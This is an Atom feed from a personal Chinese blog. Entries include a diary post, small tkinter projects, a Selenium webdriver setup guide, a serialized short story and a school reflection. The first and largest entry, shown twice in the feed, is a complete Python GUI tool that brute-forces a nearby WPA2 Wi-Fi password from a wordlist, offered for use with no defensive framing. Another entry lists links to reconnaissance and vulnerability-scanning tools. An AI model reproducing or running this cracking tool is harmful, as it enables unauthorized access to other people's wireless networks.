<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://strangepapers.github.io/</id>
    <title>strangepapers</title>
    <updated>2023-08-05T02:04:10.318Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://strangepapers.github.io/"/>
    <link rel="self" href="https://strangepapers.github.io/atom.xml"/>
    <subtitle>&lt;font face=&quot;宋体&quot; size=&quot;5&quot; color=&quot;white&quot;&gt;中国青年，自强不息&lt;/font&gt;
</subtitle>
    <logo>https://strangepapers.github.io/images/avatar.png</logo>
    <icon>https://strangepapers.github.io/favicon.ico</icon>
    <rights>All rights reserved 2023, strangepapers</rights>
    <entry>
        <title type="html"><![CDATA[python暴力破解wifi]]></title>
        <id>https://strangepapers.github.io/post/Oz8deZ6XO/</id>
        <link href="https://strangepapers.github.io/post/Oz8deZ6XO/">
        </link>
        <updated>2023-08-05T02:00:50.000Z</updated>
        <summary type="html"><![CDATA[<p>需要pywifi</p>
<pre><code class="language-python"># coding:utf-8

from tkinter import *
from tkinter import ttk  
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox

class MY_GUI():
	def __init__(self,init_window_name):
		self.init_window_name = init_window_name
		
		#密码文件路径
		self.get_value = StringVar()
		
		#获取破解wifi账号
		self.get_wifi_value = StringVar()
		
		#获取wifi密码
		self.get_wifimm_value = StringVar()
		
		self.wifi = pywifi.PyWiFi()  #抓取网卡接口
		self.iface = self.wifi.interfaces()[0] #抓取第一个无线网卡
		self.iface.disconnect()  #测试链接断开所有链接
		time.sleep(1)  #休眠1秒
		#测试网卡是否属于断开状态
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
	
	def __str__(self):
		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())
		
	#设置窗口
	def set_init_window(self):
		self.init_window_name.title(&quot;WIFI破解工具&quot;)
		self.init_window_name.geometry('+500+200')
		
		labelframe = LabelFrame(width=400, height=200,text=&quot;配置&quot;)
		labelframe.grid(column=0, row=0, padx=10, pady=10)
		
		self.search = Button(labelframe,text=&quot;搜索附近WiFi&quot;,command=self.scans_wifi_list).grid(column=0,row=0)
		
		self.pojie = Button(labelframe,text=&quot;开始破解&quot;,command=self.readPassWord).grid(column=1,row=0)
		
		self.label = Label(labelframe,text=&quot;目录路径：&quot;).grid(column=0,row=1)
		
		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)
		
		self.file = Button(labelframe,text=&quot;添加密码文件目录&quot;,command=self.add_mm_file).grid(column=2,row=1)
		
		self.wifi_text = Label(labelframe,text=&quot;WiFi账号：&quot;).grid(column=0,row=2)
		
		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)
		
		self.wifi_mm_text = Label(labelframe,text=&quot;WiFi密码：&quot;).grid(column=2,row=2)
		
		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)
		
		self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)
		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)
		
		
		# 定义树形结构与滚动条
		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show=&quot;headings&quot;,columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))		
		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)       
		self.wifi_tree.configure(yscrollcommand=self.vbar.set)
		
		# 表格的标题
		self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)
		self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)
		self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)
		self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)
         
		self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)
		self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)
		self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)
		self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)
        
		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
		self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;,self.onDBClick)
		self.vbar.grid(row=4,column=1,sticky=NS)
		
	#搜索wifi
	#cmd /k C:\Python27\python.exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; PAUSE &amp; EXIT
	def scans_wifi_list(self):  # 扫描周围wifi列表
		#开始扫描
		print(&quot;^_^ 开始扫描附近wifi...&quot;)
		self.iface.scan()
		time.sleep(15)
		#在若干秒后获取扫描结果
		scanres = self.iface.scan_results()
		#统计附近被发现的热点数量
		nums = len(scanres)
		print(&quot;数量: %s&quot;%(nums))
		#print (&quot;| %s |  %s |  %s | %s&quot;%(&quot;WIFIID&quot;,&quot;SSID&quot;,&quot;BSSID&quot;,&quot;signal&quot;))
		# 实际数据
		self.show_scans_wifi_list(scanres)
		return scanres
	
	#显示wifi列表
	def show_scans_wifi_list(self,scans_res):
		for index,wifi_info in enumerate(scans_res):
            # print(&quot;%-*s| %s | %*s |%*s\n&quot;%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
			self.wifi_tree.insert(&quot;&quot;,'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
			#print(&quot;| %s | %s | %s | %s \n&quot;%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
	
	#添加密码文件目录
	def add_mm_file(self):
		self.filename = tkinter.filedialog.askopenfilename()
		self.get_value.set(self.filename)
	
	#Treeview绑定事件
	def onDBClick(self,event):
		self.sels= event.widget.selection()
		self.get_wifi_value.set(self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
		#print(&quot;you clicked on&quot;,self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
	
	#读取密码字典，进行匹配
	def readPassWord(self):
		self.getFilePath = self.get_value.get()
		#print(&quot;文件路径：%s\n&quot; %(self.getFilePath))
		self.get_wifissid = self.get_wifi_value.get()
		#print(&quot;ssid：%s\n&quot; %(self.get_wifissid))
		self.pwdfilehander=open(self.getFilePath,&quot;r&quot;,errors=&quot;ignore&quot;)
		while True:
				try:
					self.pwdStr =self.pwdfilehander.readline()
					#print(&quot;密码: %s &quot; %(self.pwdStr))
					if not self.pwdStr:
						break
					self.bool1=self.connect(self.pwdStr,self.get_wifissid)
					#print(&quot;返回值：%s\n&quot; %(self.bool1) )
					if self.bool1:
						# print(&quot;密码正确：&quot;+pwdStr
						# res = &quot;密码:%s 正确 \n&quot;%self.pwdStr;
						self.res = &quot;===正确===  wifi名:%s  匹配密码：%s &quot;%(self.get_wifissid,self.pwdStr)
						self.get_wifimm_value.set(self.pwdStr)
						tkinter.messagebox.showinfo('提示', '破解成功！！！')
						print(self.res)
						break
					else:
						# print(&quot;密码:&quot;+self.pwdStr+&quot;错误&quot;)
						self.res = &quot;---错误--- wifi名:%s匹配密码：%s&quot;%(self.get_wifissid,self.pwdStr)
						print(self.res)
					sleep(3)
				except:
					continue
	
	#对wifi和密码进行匹配
	def connect(self,pwd_Str,wifi_ssid):
		#创建wifi链接文件
		self.profile = pywifi.Profile()
		self.profile.ssid =wifi_ssid #wifi名称
		self.profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
		self.profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
		self.profile.key = pwd_Str #密码
		self.iface.remove_all_network_profiles() #删除所有的wifi文件
		self.tmp_profile = self.iface.add_network_profile(self.profile)#设定新的链接文件
		self.iface.connect(self.tmp_profile)#链接
		time.sleep(5)
		if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
			isOK=True   
		else:
			isOK=False
		self.iface.disconnect() #断开
		time.sleep(1)
		#检查断开状态
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
		return isOK
		
def gui_start():
	init_window = Tk()
	ui = MY_GUI(init_window)
	print(ui)
	ui.set_init_window()
	#ui.scans_wifi_list()
	
	init_window.mainloop()
	
gui_start()
</code></pre>
<p>取自github。</p>
]]></summary>
        <content type="html"><![CDATA[<p>需要pywifi</p>
<pre><code class="language-python"># coding:utf-8

from tkinter import *
from tkinter import ttk  
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox

class MY_GUI():
	def __init__(self,init_window_name):
		self.init_window_name = init_window_name
		
		#密码文件路径
		self.get_value = StringVar()
		
		#获取破解wifi账号
		self.get_wifi_value = StringVar()
		
		#获取wifi密码
		self.get_wifimm_value = StringVar()
		
		self.wifi = pywifi.PyWiFi()  #抓取网卡接口
		self.iface = self.wifi.interfaces()[0] #抓取第一个无线网卡
		self.iface.disconnect()  #测试链接断开所有链接
		time.sleep(1)  #休眠1秒
		#测试网卡是否属于断开状态
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
	
	def __str__(self):
		return '(WIFI:%s,%s)' % (self.wifi,self.iface.name())
		
	#设置窗口
	def set_init_window(self):
		self.init_window_name.title(&quot;WIFI破解工具&quot;)
		self.init_window_name.geometry('+500+200')
		
		labelframe = LabelFrame(width=400, height=200,text=&quot;配置&quot;)
		labelframe.grid(column=0, row=0, padx=10, pady=10)
		
		self.search = Button(labelframe,text=&quot;搜索附近WiFi&quot;,command=self.scans_wifi_list).grid(column=0,row=0)
		
		self.pojie = Button(labelframe,text=&quot;开始破解&quot;,command=self.readPassWord).grid(column=1,row=0)
		
		self.label = Label(labelframe,text=&quot;目录路径：&quot;).grid(column=0,row=1)
		
		self.path = Entry(labelframe,width=12,textvariable = self.get_value).grid(column=1,row=1)
		
		self.file = Button(labelframe,text=&quot;添加密码文件目录&quot;,command=self.add_mm_file).grid(column=2,row=1)
		
		self.wifi_text = Label(labelframe,text=&quot;WiFi账号：&quot;).grid(column=0,row=2)
		
		self.wifi_input = Entry(labelframe,width=12,textvariable = self.get_wifi_value).grid(column=1,row=2)
		
		self.wifi_mm_text = Label(labelframe,text=&quot;WiFi密码：&quot;).grid(column=2,row=2)
		
		self.wifi_mm_input = Entry(labelframe,width=10,textvariable = self.get_wifimm_value).grid(column=3,row=2,sticky=W)
		
		self.wifi_labelframe = LabelFrame(text=&quot;wifi列表&quot;)
		self.wifi_labelframe.grid(column=0, row=3,columnspan=4,sticky=NSEW)
		
		
		# 定义树形结构与滚动条
		self.wifi_tree = ttk.Treeview(self.wifi_labelframe,show=&quot;headings&quot;,columns=(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;))		
		self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)       
		self.wifi_tree.configure(yscrollcommand=self.vbar.set)
		
		# 表格的标题
		self.wifi_tree.column(&quot;a&quot;, width=50, anchor=&quot;center&quot;)
		self.wifi_tree.column(&quot;b&quot;, width=100, anchor=&quot;center&quot;)
		self.wifi_tree.column(&quot;c&quot;, width=100, anchor=&quot;center&quot;)
		self.wifi_tree.column(&quot;d&quot;, width=100, anchor=&quot;center&quot;)
         
		self.wifi_tree.heading(&quot;a&quot;, text=&quot;WiFiID&quot;)
		self.wifi_tree.heading(&quot;b&quot;, text=&quot;SSID&quot;)
		self.wifi_tree.heading(&quot;c&quot;, text=&quot;BSSID&quot;)
		self.wifi_tree.heading(&quot;d&quot;, text=&quot;signal&quot;)
        
		self.wifi_tree.grid(row=4,column=0,sticky=NSEW)
		self.wifi_tree.bind(&quot;&lt;Double-1&gt;&quot;,self.onDBClick)
		self.vbar.grid(row=4,column=1,sticky=NS)
		
	#搜索wifi
	#cmd /k C:\Python27\python.exe &quot;$(FULL_CURRENT_PATH)&quot; &amp; PAUSE &amp; EXIT
	def scans_wifi_list(self):  # 扫描周围wifi列表
		#开始扫描
		print(&quot;^_^ 开始扫描附近wifi...&quot;)
		self.iface.scan()
		time.sleep(15)
		#在若干秒后获取扫描结果
		scanres = self.iface.scan_results()
		#统计附近被发现的热点数量
		nums = len(scanres)
		print(&quot;数量: %s&quot;%(nums))
		#print (&quot;| %s |  %s |  %s | %s&quot;%(&quot;WIFIID&quot;,&quot;SSID&quot;,&quot;BSSID&quot;,&quot;signal&quot;))
		# 实际数据
		self.show_scans_wifi_list(scanres)
		return scanres
	
	#显示wifi列表
	def show_scans_wifi_list(self,scans_res):
		for index,wifi_info in enumerate(scans_res):
            # print(&quot;%-*s| %s | %*s |%*s\n&quot;%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
			self.wifi_tree.insert(&quot;&quot;,'end',values=(index + 1,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
			#print(&quot;| %s | %s | %s | %s \n&quot;%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
	
	#添加密码文件目录
	def add_mm_file(self):
		self.filename = tkinter.filedialog.askopenfilename()
		self.get_value.set(self.filename)
	
	#Treeview绑定事件
	def onDBClick(self,event):
		self.sels= event.widget.selection()
		self.get_wifi_value.set(self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
		#print(&quot;you clicked on&quot;,self.wifi_tree.item(self.sels,&quot;values&quot;)[1])
	
	#读取密码字典，进行匹配
	def readPassWord(self):
		self.getFilePath = self.get_value.get()
		#print(&quot;文件路径：%s\n&quot; %(self.getFilePath))
		self.get_wifissid = self.get_wifi_value.get()
		#print(&quot;ssid：%s\n&quot; %(self.get_wifissid))
		self.pwdfilehander=open(self.getFilePath,&quot;r&quot;,errors=&quot;ignore&quot;)
		while True:
				try:
					self.pwdStr =self.pwdfilehander.readline()
					#print(&quot;密码: %s &quot; %(self.pwdStr))
					if not self.pwdStr:
						break
					self.bool1=self.connect(self.pwdStr,self.get_wifissid)
					#print(&quot;返回值：%s\n&quot; %(self.bool1) )
					if self.bool1:
						# print(&quot;密码正确：&quot;+pwdStr
						# res = &quot;密码:%s 正确 \n&quot;%self.pwdStr;
						self.res = &quot;===正确===  wifi名:%s  匹配密码：%s &quot;%(self.get_wifissid,self.pwdStr)
						self.get_wifimm_value.set(self.pwdStr)
						tkinter.messagebox.showinfo('提示', '破解成功！！！')
						print(self.res)
						break
					else:
						# print(&quot;密码:&quot;+self.pwdStr+&quot;错误&quot;)
						self.res = &quot;---错误--- wifi名:%s匹配密码：%s&quot;%(self.get_wifissid,self.pwdStr)
						print(self.res)
					sleep(3)
				except:
					continue
	
	#对wifi和密码进行匹配
	def connect(self,pwd_Str,wifi_ssid):
		#创建wifi链接文件
		self.profile = pywifi.Profile()
		self.profile.ssid =wifi_ssid #wifi名称
		self.profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
		self.profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
		self.profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
		self.profile.key = pwd_Str #密码
		self.iface.remove_all_network_profiles() #删除所有的wifi文件
		self.tmp_profile = self.iface.add_network_profile(self.profile)#设定新的链接文件
		self.iface.connect(self.tmp_profile)#链接
		time.sleep(5)
		if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
			isOK=True   
		else:
			isOK=False
		self.iface.disconnect() #断开
		time.sleep(1)
		#检查断开状态
		assert self.iface.status() in\
				[const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
		return isOK
		
def gui_start():
	init_window = Tk()
	ui = MY_GUI(init_window)
	print(ui)
	ui.set_init_window()
	#ui.scans_wifi_list()
	
	init_window.mainloop()
	
gui_start()
</code></pre>
<p>取自github。</p>
<!-- more -->
<!-- more -->
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[WHO care us.]]></title>
        <id>https://strangepapers.github.io/post/NoftwTtC_/</id>
        <link href="https://strangepapers.github.io/post/NoftwTtC_/">
        </link>
        <updated>2023-07-30T10:43:45.000Z</updated>
        <content type="html"><![CDATA[<p>别看错，世界卫生组织正在关心我们。</p>
<h1 id="">🤡</h1>
<p>我是小丑，是想吃天鹅肉的癞蛤蟆。<br>
我也是天真，也是我的错。<br>
真的吗？<br>
谁都不知道。<br>
二十来天，也就是把我抬起来，然后使劲砸到沟里。<br>
疼死了。</p>
<h1 id="狂人日记">狂人日记</h1>
<p>在家呆着给我憋成了一个疯子。<br>
看着朋友圈一个个全是分手的，就连老师都出现了感情危机。<br>
？<br>
？<br>
这个是干什么。</p>
<h1 id="music">MUSIC</h1>
<p>音乐是合法的毒品。<br>
对于这两天，也就只有它了。</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1929285360&auto=0&height=66"></iframe>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python微项目]]></title>
        <id>https://strangepapers.github.io/post/LfrHolf_b/</id>
        <link href="https://strangepapers.github.io/post/LfrHolf_b/">
        </link>
        <updated>2023-07-29T23:13:24.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="简易计算器">简易计算器</h1>
<p>需要tkinter</p>
<pre><code class="language-python">import tkinter as tk
import time


def on_click(key):
    current_text = entry.get()

    if key == &quot;C&quot;:
        entry.delete(0, tk.END)
    elif key == &quot;=&quot;:
        try:
            result = eval(current_text)
            entry.delete(0, tk.END)
            entry.insert(tk.END, str(result))
        except Exception as e:
            entry.delete(0, tk.END)
            entry.insert(tk.END, &quot;Error&quot;)
    else:
        entry.insert(tk.END, key)

# 创建主窗口
root = tk.Tk()
root.title(&quot;简易计算器&quot;)

# 设置计算器背景色
root.configure(bg=&quot;#f0f0f0&quot;)

# 设置输入框样式
entry_style = {
    &quot;width&quot;: 20,
    &quot;font&quot;: (&quot;Arial&quot;, 24),
    &quot;bd&quot;: 10,   # 边框宽度
    &quot;relief&quot;: tk.SOLID,   # 边框样式
    &quot;bg&quot;: &quot;#ffffff&quot;,      # 背景色
}

entry = tk.Entry(root, **entry_style)
entry.grid(row=0, column=0, columnspan=4, padx=10, pady=10, sticky=&quot;nsew&quot;)

# 设置按钮样式
button_style = {
    &quot;font&quot;: (&quot;Arial&quot;, 20),
    &quot;width&quot;: 5,
    &quot;height&quot;: 2,
    &quot;bd&quot;: 5,   # 边框宽度
    &quot;relief&quot;: tk.RAISED,  # 边框样式
    &quot;bg&quot;: &quot;#e0e0e0&quot;,      # 背景色
    &quot;activebackground&quot;: &quot;#d0d0d0&quot;,  # 按下时的背景色
}

# 定义按钮文本
buttons = [
    (&quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;/&quot;),
    (&quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;*&quot;),
    (&quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;-&quot;),
    (&quot;0&quot;, &quot;.&quot;, &quot;=&quot;, &quot;+&quot;),
    (&quot;C&quot;,)
]

# 创建并放置按钮
for i in range(len(buttons)):
    for j in range(len(buttons[i])):
        btn = tk.Button(root, text=buttons[i][j], **button_style,
                        command=lambda key=buttons[i][j]: on_click(key))
        btn.grid(row=i+1, column=j, padx=5, pady=5, sticky=&quot;nsew&quot;)

# 设置网格布局权重，使得按钮可以自动填充窗口大小
for i in range(5):
    root.grid_rowconfigure(i+1, weight=1)
    root.grid_columnconfigure(i, weight=1)

# 运行主循环
root.mainloop()
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://img1.imgtp.com/2023/07/30/Rm9mu8Yc.png" alt="1690672551158.png" loading="lazy"></figure>
<h1 id="电子时钟">电子时钟</h1>
<p>需要tkinter</p>
<pre><code class="language-python">import tkinter as tk
import datetime

def update_time():
    # 获取当前时间（UTC时间）
    utc_time = datetime.datetime.utcnow()

    # 设置北京时区偏移量
    beijing_offset = datetime.timedelta(hours=8)

    # 计算北京时间
    beijing_time = utc_time + beijing_offset

    # 格式化时间为字符串（精确到微秒）
    utc_time_str = utc_time.strftime(&quot;%Y-%m-%d %H:%M:%S.%f&quot;)[:-3]
    beijing_time_str = beijing_time.strftime(&quot;%Y-%m-%d %H:%M:%S.%f&quot;)[:-3]

    # 更新标签文本
    utc_label.config(text=&quot;UTC 时间：\n&quot; + utc_time_str)
    beijing_label.config(text=&quot;北京时间：\n&quot; + beijing_time_str)

    # 每隔100毫秒更新时间
    root.after(100, update_time)

# 创建主窗口
root = tk.Tk()
root.title(&quot;电子时钟&quot;)

# 创建标签用于显示时间
utc_label = tk.Label(root, font=(&quot;Helvetica&quot;, 14), justify='left')
utc_label.pack(side='left', padx=10, pady=10)

beijing_label = tk.Label(root, font=(&quot;Helvetica&quot;, 14), justify='left')
beijing_label.pack(side='right', padx=10, pady=10)

# 开始更新时间
update_time()

# 运行主循环
root.mainloop()
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://img1.imgtp.com/2023/07/30/Uf72Lnpl.png" alt="1690672598189.png" loading="lazy"></figure>
<h1 id="强密码生成器">强密码生成器</h1>
<p>需要tkinter</p>
<pre><code class="language-python">import random
import string
import tkinter as tk
from tkinter import messagebox

def generate_strong_password(length=12):
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

def generate_password_button():
    password_length = int(length_entry.get())
    if password_length &lt; 8:
        messagebox.showerror(&quot;Error&quot;, &quot;密码长度应至少为8位&quot;)
        return

    strong_password = generate_strong_password(password_length)
    password_result_label.config(text=&quot;生成的强密码：\n&quot; + strong_password)

# 创建主窗口
root = tk.Tk()
root.title(&quot;强密码生成器&quot;)

# 添加控件
length_label = tk.Label(root, text=&quot;密码长度：&quot;)
length_label.pack(pady=10)
length_entry = tk.Entry(root)
length_entry.pack(pady=5)
generate_button = tk.Button(root, text=&quot;生成密码&quot;, command=generate_password_button)
generate_button.pack(pady=10)
password_result_label = tk.Label(root, text=&quot;&quot;)
password_result_label.pack()

# 运行主循环
root.mainloop()
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://img1.imgtp.com/2023/07/30/IPTG9YGg.png" alt="1690672799351.png" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[webdriver的下载与安装]]></title>
        <id>https://strangepapers.github.io/post/pwzMS8B1O/</id>
        <link href="https://strangepapers.github.io/post/pwzMS8B1O/">
        </link>
        <updated>2023-07-29T09:20:04.000Z</updated>
        <content type="html"><![CDATA[<h1 id="webdriver可以干神马">webdriver可以干神马</h1>
<p>webdriver，顾名思义，可以代替人工来在浏览器上执行一些命令或程序。<br>
不同的浏览器会有不同的webdriver，版本不同，webdriver也会不同。</p>
<h1 id="webdriver的下载">webdriver的下载</h1>
<p>以EDGE为例，Microsoft Edge拥有官方webdriver下载地址，但下载之前，你要转到浏览器设置，查看你浏览器的版本。<br>
<img src="https://img1.imgtp.com/2023/07/29/AOxRNUqx.png" alt="屏幕截图 2023-07-29 172514.png" loading="lazy"><br>
记住你的浏览器版本号，转到https://developer.microsoft.com/zh-cn/microsoft-edge/tools/webdriver/，下载适配你的浏览器的webdriver。<br>
你会下载到一个压缩包，请你解压，并提取里面的exe程序。<br>
<img src="https://img1.imgtp.com/2023/07/29/VjXBbwMw.png" alt="1690622964748.png" loading="lazy"><br>
运行应用程序你会看到“webdriver已成功运行。”<br>
<img src="https://img1.imgtp.com/2023/07/29/Iw7sXrid.png" alt="1690623050039.png" loading="lazy"></p>
<h1 id="webdriver的安装">webdriver的安装</h1>
<p>以PYTHON为例，python需要Selenium的附加。</p>
<h2 id="安装selenium">安装Selenium</h2>
<p>在命令提示符下输入</p>
<pre><code>pip install selenium 
</code></pre>
<p>即可安装。<br>
通过在python中运行</p>
<pre><code>import selenium
help(selenium)
</code></pre>
<p>检查安装是否成功。</p>
<h2 id="安装webdriver">安装webdriver</h2>
<p>我们只需将下载好的webdriver的exe应用程序复制到python的目录下即可。</p>
<h1 id="测试与报错">测试与报错</h1>
<p>自此我们已经成功安装webdriver。</p>
<pre><code class="language-python">from selenium import webdriver
from selenium.webdriver.common.by import By
import time

driver = webdriver.Edge()

driver.get('https://bing.com')

element = driver.find_element(By.ID, 'sb_form_q')
element.send_keys('WebDriver')
element.submit()

time.sleep(5)
driver.quit()
</code></pre>
<p>通过这份python程序可以测试webdriver是否安装成功。</p>
<h2 id="报错">报错</h2>
<p>为什么webdriver用着用着就会报错？<br>
浏览器的更新会使webdriver不可用，你需重新下载以更新webdriver</p>
<h1 id="其他">其他</h1>
<p>其他浏览器的webdriver可以在其官网找到并下载。<br>
各个编程语言对应的安装方式不同，你可以在网上浏览以找到安装方法。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[web攻防工具收集]]></title>
        <id>https://strangepapers.github.io/post/EMri5LUJN/</id>
        <link href="https://strangepapers.github.io/post/EMri5LUJN/">
        </link>
        <updated>2023-06-09T07:30:09.000Z</updated>
        <content type="html"><![CDATA[<p>来自知乎<br>
作者：网络安全-无涯</p>
<p>#1、半/全自动化工具<br>
<a href="https://link.zhihu.com/?target=https%3A//github.com/0x727/ShuiZe_0x727">一条龙服务，只需要输入根域名即可全方位收集相关资产，并检测漏洞。也可以输入多个域名、C段IP等，具体案例见下文。</a><br>
<a href="https://link.zhihu.com/?target=https%3A//github.com/lcvvvv/kscan">可针对指定IP段、资产清单、存活网段自动化进行端口扫描以及TCP指纹识别和Banner抓取</a><br>
<a href="https://link.zhihu.com/?target=https%3A//github.com/Bywalks/DarkAngel">DarkAngel 是一款全自动白帽漏洞扫描器，从hackerone、bugcrowd资产监听到漏洞报告生成、企业微信通知。</a></p>
<h1 id="2-资产发现工具">2、资产发现工具</h1>
<p><a href="https://link.zhihu.com/?target=https%3A//github.com/six2dez/reconftw">reconFTW 集成了30个工具的信息收集利器</a><br>
<a href="https://link.zhihu.com/?target=https%3A//github.com/tomnomnom/waybackurls">从第三方平台获取目标网页内容	</a><br>
<a href="https://link.zhihu.com/?target=https%3A//github.com/wgpsec/ENScan_GO">一款基于各大企业信息API的工具</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[古阳]]></title>
        <id>https://strangepapers.github.io/post/UsAExxChL/</id>
        <link href="https://strangepapers.github.io/post/UsAExxChL/">
        </link>
        <updated>2023-06-08T14:39:33.000Z</updated>
        <content type="html"><![CDATA[<p>“哈哈哈哈哈哈”</p>
<h1 id="第一日">第一日</h1>
<p>“宋阿文，你入党申请书写好了吗？”<br>
阿文坐在窗边，眼睛盯着窗外竹林里的其中一棵。放着申请书的档案袋放在桌子上，<br>
“写好了，我一会邮出去。”<br>
阿文生在云南小村，长在云南小村。这小村也不知道叫什么，老人们说这村子叫“流芳”，阿文认为叫“福邦”，因为他的初中老师说过当地有一个村子，都是长寿之人，外面的人都叫这里是宝地。宝地怎么能被流芳呢，按照老人们模糊不清的发音，阿文觉得大差不差就是“福邦”，但一个村子怎么能叫做“邦”呢？<br>
他也想不明白。<br>
这里没有学校，阿文上的县城里的小学和初中，在村里他也是一个知识青年了。阿文家里就是普通的家庭，父亲宋埠炒茶叶赚钱，母亲郭仁在家编竹篮，生活虽苦，但他们生活的甜甜蜜蜜。<br>
阿文拿着文件袋到了邮局，将申请书寄到了县里，入党是阿文梦寐以求的。<br>
“叔叔，麻烦把这个邮到县里的中学。”<br>
日落，夕阳穿过竹林，散散的光线扑到地面上。阿文很高兴，</p>
<blockquote>
<p>树叶落下来，什么也不用想，多快活！<br>
鸟在天上飞，什么也不用看，多快活！</p>
</blockquote>
<p>当阿文到家时，天已完全黑了。</p>
<h1 id="第二日">第二日</h1>
<p>太阳升起来了，还是那么安静，悄悄地升起来，只告诉那些早起的人们和一些公鸡。<br>
阿文还在赖床，即使他很想起床。他今天心情很高兴，也许是今天不用去学校，还没有家庭作业吧。<br>
好一会儿，他穿上衣服，走到屋后的小河边，用清冽的河水洗了洗脸。<br>
他想写点东西。<br>
宋阿文极具文学天赋，他的诗歌在校文学刊有很多美名，但阿文没有跟任何人提过诗歌的作者就是阿文，留的署名是阿文自己想的人名<br>
<strong>角马</strong><br>
现在，他坐在写作台前，纸笔已经放好。<br>
他还在想，想昨天去邮局，想回来时空气中的竹子味。<br>
他写</p>
<blockquote>
<p>下雨了<br>
雨里的人是我<br>
人们都不希望下雨<br>
因为雨会让人们的衣裳淋透<br>
雨停了<br>
我还是我<br>
人们倒开始希望下雨<br>
因为雨会让人们种的东西生长<br>
奇怪！奇怪！<br>
人们可真奇怪！<br>
但转念一想<br>
我也很奇怪<br>
下雨了却不去避雨<br>
干旱了却不去浇水<br>
我可真奇怪<br>
那到底什么不奇怪呢</p>
</blockquote>
<p>他看了一遍，觉得不好。刚要改动，阿妈郭仁招呼阿文吃早饭。<br>
“阿妈等一下再去吃。”<br>
郭仁很着急，因为吃完早饭要带阿文去赶集。<br>
今天是村里一月一度的大集，村里大部分人都会在街上转上一圈，并且街上会有很多的商贩，邻村的小贩也会来这里凑凑热闹。<br>
阿文喜欢跟着阿妈一起赶集，况且昨天刚下完雨，阿文喜欢闻雨的味道。</p>
<p>To be continued···</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[有感]]></title>
        <id>https://strangepapers.github.io/post/2DA412xAJ/</id>
        <link href="https://strangepapers.github.io/post/2DA412xAJ/">
        </link>
        <updated>2023-04-30T12:04:40.000Z</updated>
        <content type="html"><![CDATA[<p>#家长会喽</p>
<h2 id="排练">排练</h2>
<p>提前3天排练，有一次晚上下雨，天色压抑，空中的鸟无头乱飞，下面的小虫子乱飞。<br>
不一会，就下起了大雨，不得不跑回去。<br>
那是我从高一记得起下的最大的一场雨。</p>
<h2 id="效果不错">效果不错</h2>
<p>嗯，效果不错。<br>
😘<br>
我爹娘写的期盼信比我写的感恩信写的好。</p>
